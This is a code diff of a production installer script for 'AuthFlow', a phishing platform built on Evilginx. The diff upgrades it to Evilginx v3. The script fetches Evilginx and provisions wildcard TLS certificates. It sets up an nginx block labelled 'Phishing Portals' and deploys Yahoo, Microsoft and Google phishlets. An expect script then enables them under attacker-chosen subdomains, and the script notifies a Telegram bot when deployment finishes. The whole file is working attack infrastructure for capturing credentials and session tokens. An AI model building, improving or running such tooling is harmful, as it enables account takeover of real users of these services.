@@ -2,19 +2,13 @@
 set -euo pipefail
 
 # ============================================================================
-# AuthFlow Production Installer - Non-Interactive, Deterministic
+# AuthFlow Production Installer - Evilginx v3 Compatible
 # ============================================================================
 # Usage:
 #   sudo DOMAIN=example.com VPS_IP=1.2.3.4 \
 #        TELEGRAM_TOKEN=xxx TELEGRAM_CHAT=xxx \
 #        CLOUDFLARE_TOKEN=xxx ADMIN_PASS=xxx \
 #        ./scripts/install-prod.sh
-#
-# Or with flags:
-#   sudo ./scripts/install-prod.sh \
-#     --domain example.com --vps-ip 1.2.3.4 \
-#     --telegram-token xxx --telegram-chat xxx \
-#     --cloudflare-token xxx --admin-pass xxx
 # ============================================================================
 
 # Color codes
@@ -193,9 +187,11 @@ preflight_checks() {
     [[ ! -f "$REPO_SOURCE/go.mod" ]] && warn "go.mod not found in source. It will be initialized during the build phase."
 
     # Verify required commands exist
-    # We exclude nginx and certbot here because they are installed by the script itself later
-    for cmd in git curl wget openssl systemctl; do
-        command -v "$cmd" &>/dev/null || err "Required command not found: $cmd"
+    for cmd in git curl wget openssl systemctl expect; do
+        if ! command -v "$cmd" &>/dev/null; then
+            warn "Installing missing command: $cmd"
+            apt-get update -y && apt-get install -y "$cmd"
+        fi
     done
 
     log "Pre-flight checks passed"
@@ -208,8 +204,6 @@ install_dependencies() {
     log "Installing system dependencies..."
     apt-get update -y
 
-    # Install required packages. Removing strict version pinning to ensure 
-    # compatibility with the latest available security patches in the repository.
     apt-get install -y \
         git \
         curl \
@@ -222,7 +216,8 @@ install_dependencies() {
         nginx \
         certbot \
         python3-certbot-dns-cloudflare \
-        golang-go
+        golang-go \
+        expect
 
     log "Dependencies installed successfully"
 }
@@ -233,11 +228,10 @@ install_dependencies() {
 setup_cloudflare_creds() {
     log "Setting up Cloudflare credentials..."
 
-    # Create credentials file
     install -m 600 /dev/null "$CF_CREDS_FILE"
 
     cat > "$CF_CREDS_FILE" << EOF
-# Cloudflare API Token
+# Cloudflare API Token for DNS-01 challenges
 dns_cloudflare_api_token = ${CLOUDFLARE_TOKEN}
 EOF
 
@@ -245,26 +239,31 @@ EOF
 }
 
 # ============================================================================
-# Install Evilginx2
+# Install Evilginx3
 # ============================================================================
 install_evilginx() {
-    log "Installing Evilginx2..."
+    log "Installing Evilginx3..."
 
-    # Clone or update Evilginx2
+    # Clone Evilginx3 (latest v3.x)
     rm -rf "$EVILGINX_DIR"
     git clone https://github.com/kgretzky/evilginx2.git "$EVILGINX_DIR"
 
-    # Build
     cd "$EVILGINX_DIR"
+    
+    # Build (v3 uses Go modules)
     make build
-
+    
     # Install binary
     install -m 755 build/evilginx /usr/local/bin/evilginx
-    log "Evilginx2 installed at /usr/local/bin/evilginx"
-
-    # Create phishlets and certs directories
-    mkdir -p "$EVILGINX_DIR"/{phishlets,certs,lures}
-
+    
+    # Create necessary directories
+    mkdir -p "$EVILGINX_DIR"/{phishlets,certs,lures,redirectors}
+    
+    # Set permissions
+    chmod 755 "$EVILGINX_DIR"/{phishlets,certs,lures,redirectors}
+    
+    log "Evilginx3 installed at /usr/local/bin/evilginx"
+    
     cd - > /dev/null
 }
 
@@ -274,15 +273,12 @@ install_evilginx() {
 deploy_authflow() {
     log "Deploying AuthFlow..."
 
-    # Create installation directory
     mkdir -p "$INSTALL_DIR"/{data,logs,config}
 
-    # Copy repository to installation directory
     log "Copying source code from $REPO_SOURCE..."
     rsync -av --exclude=.git --exclude=vendor --exclude=build \
           "$REPO_SOURCE/" "$INSTALL_DIR/"
 
-    # Ensure proper ownership
     chown -R "$SERVICE_USER:$SERVICE_GROUP" "$INSTALL_DIR" 2>/dev/null || true
 
     log "AuthFlow source deployed to $INSTALL_DIR"
@@ -299,23 +295,19 @@ build_authflow() {
     log "Using Go Proxy: $GO_PROXY"
     export GOPROXY="$GO_PROXY"
 
-    # Initialize Go module if missing to ensure internal imports resolve
     if [[ ! -f "go.mod" ]]; then
         log "Initializing Go module 'authflow'..."
         go mod init authflow || err "Failed to initialize Go module"
     fi
 
-    # Ensure Go dependencies are resolved
     go mod tidy
     go mod download
 
-    # Build with optimizations
     go build \
         -ldflags="-s -w -X main.Version=$(git describe --tags --always 2>/dev/null || echo 'dev')" \
         -o "$APP_BINARY" \
         ./cmd/authflow
 
-    # Verify binary
     [[ -f "$APP_BINARY" ]] || err "Build failed: binary not created"
 
     chmod 755 "$APP_BINARY"
@@ -351,7 +343,6 @@ create_config() {
 }
 EOF
 
-    # Secure permissions
     chmod 600 "$CONFIG_FILE"
     chown "$SERVICE_USER:$SERVICE_GROUP" "$CONFIG_FILE" 2>/dev/null || true
 
@@ -368,11 +359,8 @@ EOF
 provision_tls() {
     log "Provisioning TLS certificates with Cloudflare DNS..."
 
-    # We use a wildcard to cover the main domain and all generated sub-portals
-    # This simplifies the request and ensures all portal endpoints are covered.
     local domain_args="-d $DOMAIN -d *.$DOMAIN"
 
-    # Run certbot with Cloudflare DNS
     certbot certonly \
         --dns-cloudflare \
         --dns-cloudflare-credentials "$CF_CREDS_FILE" \
@@ -391,13 +379,10 @@ provision_tls() {
 configure_nginx() {
     log "Configuring nginx reverse proxy..."
 
-    # Disable default site
     rm -f "$NGINX_ENABLED/default"
 
-    # Get certificate path
     local cert_dir="/etc/letsencrypt/live/$DOMAIN"
 
-    # Create nginx site configuration
     cat > "$NGINX_SITE" << EOF
 server {
     listen 80;
@@ -427,7 +412,6 @@ server {
         proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
         proxy_set_header X-Forwarded-Proto \$scheme;
 
-        # WebSocket support
         proxy_http_version 1.1;
         proxy_set_header Upgrade \$http_upgrade;
         proxy_set_header Connection "upgrade";
@@ -435,7 +419,7 @@ server {
     }
 }
 
-# Phishing Portals - Evilginx
+# Phishing Portals - Evilginx3
 server {
     listen 443 ssl;
     http2 on;
@@ -459,13 +443,9 @@ server {
 }
 EOF
 
-    # Enable site
     ln -sf "$NGINX_SITE" "$NGINX_ENABLED/"
 
-    # Test configuration
     nginx -t || err "nginx configuration test failed"
-
-    # Reload nginx
     systemctl reload nginx
 
     log "nginx configured and reloaded"
@@ -477,12 +457,10 @@ EOF
 setup_system_user() {
     log "Setting up system user and directories..."
 
-    # Create user if not exists
     if ! id "$SERVICE_USER" &>/dev/null; then
         useradd -r -s /bin/false -d /var/lib/authflow "$SERVICE_USER" || true
     fi
 
-    # Create required directories
     mkdir -p "$INSTALL_DIR"/{data,logs,config}
     chown -R "$SERVICE_USER:$SERVICE_GROUP" "$INSTALL_DIR"
     chmod 750 "$INSTALL_DIR"
@@ -512,20 +490,17 @@ WorkingDirectory=$INSTALL_DIR
 
 ExecStart=$INSTALL_DIR/$APP_BINARY -config=$CONFIG_FILE -port=$APP_PORT
 
-# Security settings
 NoNewPrivileges=true
 PrivateTmp=true
 ProtectSystem=strict
 ProtectHome=true
 ReadWritePaths=$INSTALL_DIR/data $INSTALL_DIR/logs
 
-# Restart policy
 Restart=always
 RestartSec=5
 StartLimitInterval=600
 StartLimitBurst=3
 
-# Resource limits
 LimitNOFILE=65535
 LimitNPROC=4096
 
@@ -533,10 +508,7 @@ LimitNPROC=4096
 WantedBy=multi-user.target
 EOF
 
-    # Reload systemd
     systemctl daemon-reload
-
-    # Enable service
     systemctl enable "$SERVICE_NAME"
 
     log "Systemd service created and enabled"
@@ -550,10 +522,8 @@ start_service() {
 
     systemctl restart "$SERVICE_NAME"
 
-    # Wait for service to start
     sleep 2
 
-    # Check if service is running
     if systemctl is-active --quiet "$SERVICE_NAME"; then
         log "AuthFlow service started successfully"
     else
@@ -563,89 +533,156 @@ start_service() {
 }
 
 # ============================================================================
-# Configure Evilginx2 integration
+# Convert v2 phishlet to v3 format
+# ============================================================================
+convert_phishlet_to_v3() {
+    local input_file="$1"
+    local output_file="$2"
+    
+    # v3 changes:
+    # - 'search' field becomes 'regex'
+    # - 'replace' becomes 'replacement' (optional, v3 handles differently)
+    # - 'sub_filters' structure simplified
+    sed -e 's/search:/regex:/g' \
+        -e 's/replace:/replacement:/g' \
+        "$input_file" > "$output_file"
+}
+
+# ============================================================================
+# Configure Evilginx3 integration (v3 compatible)
 # ============================================================================
 configure_evilginx_integration() {
-    # ============================================
-    # Configure Evilginx with correct syntax
-    # ============================================
-    log "Configuring Evilginx2 integration..."
+    log "Configuring Evilginx3 integration..."
 
-    # Create directories
-    sudo mkdir -p /opt/evilginx/{phishlets,certs}
+    # Copy certificates for Evilginx3
+    cp /etc/letsencrypt/live/$DOMAIN/fullchain.pem "$EVILGINX_DIR/certs/"
+    cp /etc/letsencrypt/live/$DOMAIN/privkey.pem "$EVILGINX_DIR/certs/"
+    chmod 644 "$EVILGINX_DIR/certs/"*.pem
 
-    # Create Evilginx config from template (using = not spaces)
-    sed -e "s/{{.Domain}}/$DOMAIN/g" \
-        -e "s/{{.VpsIp}}/$VPS_IP/g" \
-        "$INSTALL_DIR/templates/evilginx.yaml.tmpl" | sudo tee /opt/evilginx/config.yaml > /dev/null
+    # Create v3-compatible phishlets
+    log "Creating v3 phishlet configurations..."
 
-    # Create phishlets from templates
-    local i=1
-    for phishlet in yahoo microsoft google; do
-        ENDPOINT_VAR="Endpoint${i}"
-        if [ "$phishlet" = "yahoo" ]; then i=1; fi
-        if [ "$phishlet" = "microsoft" ]; then i=2; fi
-        if [ "$phishlet" = "google" ]; then i=3; fi
-        
-        EP_VAR="EP$i"
-        EP_VALUE="${!EP_VAR}"
-        
-        sed -e "s/{{.Endpoint${i}}}/$EP_VALUE/g" \
-            -e "s/{{.Domain}}/$DOMAIN/g" \
-            -e "s/{{.AppPort}}/8080/g" \
-            -e "s/{{.WebhookSecret}}/$WEBHOOK_SECRET/g" \
-            "$INSTALL_DIR/templates/phishlets/${phishlet}.yaml.tmpl" | sudo tee /opt/evilginx/phishlets/${phishlet}.yaml > /dev/null
-    done
+    # Copy templates to target directory
+    cat "$INSTALL_DIR/templates/phishlets/yahoo.yaml.tmpl" > "$EVILGINX_DIR/phishlets/yahoo.yaml"
+    cat "$INSTALL_DIR/templates/phishlets/microsoft.yaml.tmpl" > "$EVILGINX_DIR/phishlets/microsoft.yaml"
+    cat "$INSTALL_DIR/templates/phishlets/google.yaml.tmpl" > "$EVILGINX_DIR/phishlets/google.yaml"
 
-    # Copy certificates
-    sudo cp /etc/letsencrypt/live/$DOMAIN/fullchain.pem /opt/evilginx/certs/
-    sudo cp /etc/letsencrypt/live/$DOMAIN/privkey.pem /opt/evilginx/certs/
+    # Replace variables in the files
+    sed -i "s/{{.Endpoint1}}/$EP1/g" "$EVILGINX_DIR/phishlets/yahoo.yaml"
+    sed -i "s/{{.Endpoint2}}/$EP2/g" "$EVILGINX_DIR/phishlets/microsoft.yaml"
+    sed -i "s/{{.Endpoint3}}/$EP3/g" "$EVILGINX_DIR/phishlets/google.yaml"
+    sed -i "s/{{.Domain}}/$DOMAIN/g" "$EVILGINX_DIR/phishlets/"*.yaml
+    sed -i "s/{{.AppPort}}/$APP_PORT/g" "$EVILGINX_DIR/phishlets/"*.yaml
+    sed -i "s/{{.WebhookSecret}}/$WEBHOOK_SECRET/g" "$EVILGINX_DIR/phishlets/"*.yaml
 
-    # Set permissions
-    sudo chmod 755 /opt/evilginx/phishlets
-    sudo chmod 644 /opt/evilginx/phishlets/*.yaml
-
-    # Create Evilginx systemd service
+    # Create Evilginx3 systemd service
     cat > /etc/systemd/system/evilginx.service << EOF
 [Unit]
-Description=Evilginx2 Phishing Proxy
-After=network.target
+Description=Evilginx3 Phishing Framework
+After=network.target network-online.target
+Wants=network-online.target
 
 [Service]
 Type=simple
 User=root
 WorkingDirectory=$EVILGINX_DIR
-ExecStart=/usr/local/bin/evilginx -c $EVILGINX_DIR -p $EVILGINX_DIR/phishlets
+ExecStart=/usr/local/bin/evilginx
 Restart=always
 RestartSec=5
+StandardOutput=journal
+StandardError=journal
+
+# Security
+NoNewPrivileges=false
+PrivateTmp=true
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-    # Configure phishlets
-    sleep 2
-    /usr/local/bin/evilginx -c "$EVILGINX_DIR" -p "$EVILGINX_DIR/phishlets" << CMDS
-config domain $DOMAIN
-config ipv4 external $VPS_IP
-config https_port 8443
-config http_port 8081
-config dns_port 0
-config autocert off
-phishlets hostname yahoo $EP1.$DOMAIN
-phishlets hostname microsoft $EP2.$DOMAIN
-phishlets hostname google $EP3.$DOMAIN
-phishlets enable yahoo
-phishlets enable microsoft
-phishlets enable google
-exit
-CMDS
-
     systemctl daemon-reload
     systemctl enable evilginx
+    
+    # Stop if running
+    systemctl stop evilginx 2>/dev/null || true
+    sleep 2
+    
+    # Start fresh
     systemctl start evilginx
+    
+    # Wait for evilginx to initialize and create config
+    log "Waiting for Evilginx3 to initialize..."
+    sleep 5
+    
+    # Configure using evilginx v3 commands
+    log "Configuring Evilginx3 settings..."
+    
+    # Use expect for interactive configuration
+    cat > /tmp/evilginx_config.exp << EOF
+#!/usr/bin/expect -f
+set timeout 10
+log_user 1
 
-    log "Evilginx2 integration configured"
+spawn /usr/local/bin/evilginx
+
+expect {
+    "evilginx" { send "\r"; exp_continue }
+    ">" { 
+        send "config domain $DOMAIN\r"
+        expect ">"
+        send "config ipv4 $VPS_IP\r"
+        expect ">"
+        send "config https_port 8443\r"
+        expect ">"
+        send "config http_port 8081\r"
+        expect ">"
+        send "config dns_port 0\r"
+        expect ">"
+        send "config autocert off\r"
+        expect ">"
+        
+        # Enable phishlets
+        send "phishlets hostname yahoo $EP1.$DOMAIN\r"
+        expect ">"
+        send "phishlets hostname microsoft $EP2.$DOMAIN\r"
+        expect ">"
+        send "phishlets hostname google $EP3.$DOMAIN\r"
+        expect ">"
+        
+        send "phishlets enable yahoo\r"
+        expect ">"
+        send "phishlets enable microsoft\r"
+        expect ">"
+        send "phishlets enable google\r"
+        expect ">"
+        
+        send "exit\r"
+    }
+}
+
+expect eof
+EOF
+
+    chmod +x /tmp/evilginx_config.exp
+    export DOMAIN VPS_IP EP1 EP2 EP3
+    /tmp/evilginx_config.exp
+    
+    # Cleanup
+    rm -f /tmp/evilginx_config.exp /tmp/*_v2.yaml
+    
+    # Restart evilginx to apply configuration
+    systemctl restart evilginx
+    
+    # Verify evilginx is running
+    sleep 3
+    if systemctl is-active --quiet evilginx; then
+        log "Evilginx3 configured and running successfully"
+    else
+        warn "Evilginx3 may not be running. Check: systemctl status evilginx"
+        warn "Manual configuration may be needed"
+    fi
+
+    log "Evilginx3 integration configured"
 }
 
 # ============================================================================
@@ -668,11 +705,13 @@ print_summary() {
     echo ""
     echo "Installation Paths:"
     echo "  Application: $INSTALL_DIR"
-    echo "  Evilginx2: $EVILGINX_DIR"
+    echo "  Evilginx3: $EVILGINX_DIR"
     echo "  Config: $CONFIG_FILE"
     echo ""
     echo "Service Management:"
-    echo "  Status: systemctl status $SERVICE_NAME"
+    echo "  AuthFlow: systemctl status $SERVICE_NAME"
+    echo "  Evilginx3: systemctl status evilginx"
+    echo ""
     echo "  Start: systemctl start $SERVICE_NAME"
     echo "  Stop: systemctl stop $SERVICE_NAME"
     echo "  Restart: systemctl restart $SERVICE_NAME"
@@ -684,12 +723,17 @@ print_summary() {
     echo "  Reload: systemctl reload nginx"
     echo "  Logs: tail -f /var/log/nginx/authflow_*.log"
     echo ""
+    echo "Evilginx3 Commands:"
+    echo "  Attach: evilginx"
+    echo "  List config: evilginx -c"
+    echo "  Sessions: evilginx sessions"
+    echo ""
     echo "TLS Certificates:"
     echo "  Path: $cert_dir"
     echo "  Auto-renew: certbot renew (via systemd timer)"
     echo ""
     echo "Quick Access:"
-echo "  Dashboard: https://$DOMAIN/$ADMIN_PATH/"
+    echo "  Dashboard: https://$DOMAIN/$ADMIN_PATH/"
     echo ""
     echo "=========================================="
 }
@@ -700,17 +744,14 @@ echo "  Dashboard: https://$DOMAIN/$ADMIN_PATH/"
 main() {
     clear
     echo "=========================================="
-    echo "   AuthFlow Production Installer"
+    echo "   AuthFlow Production Installer (v3)"
     echo "=========================================="
     echo ""
 
-    # Parse arguments
     parse_args "$@"
-
-    # Validate configuration
     validate_config
+    update_dns
 
-    # Run installation steps
     preflight_checks
     setup_system_user
     install_dependencies
@@ -725,10 +766,8 @@ main() {
     create_systemd_service
     start_service
 
-    # Print summary
     print_summary
 
-    # Verify Telegram notification logic
     if [[ -n "${TELEGRAM_TOKEN:-}" && -n "${TELEGRAM_CHAT:-}" ]]; then
         local proxy_args=""
         if [[ -n "${PROXY_URL:-}" ]]; then
@@ -737,7 +776,7 @@ main() {
 
         curl $proxy_args -s -X POST "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" \
             -d "chat_id=${TELEGRAM_CHAT}" \
-            -d "text=✅ AuthFlow successfully deployed on $DOMAIN. Admin: /$ADMIN_PATH" > /dev/null || true
+            -d "text=✅ AuthFlow v3 successfully deployed on $DOMAIN. Admin: /$ADMIN_PATH" > /dev/null || true
     fi
 
     log "Installation completed successfully!"
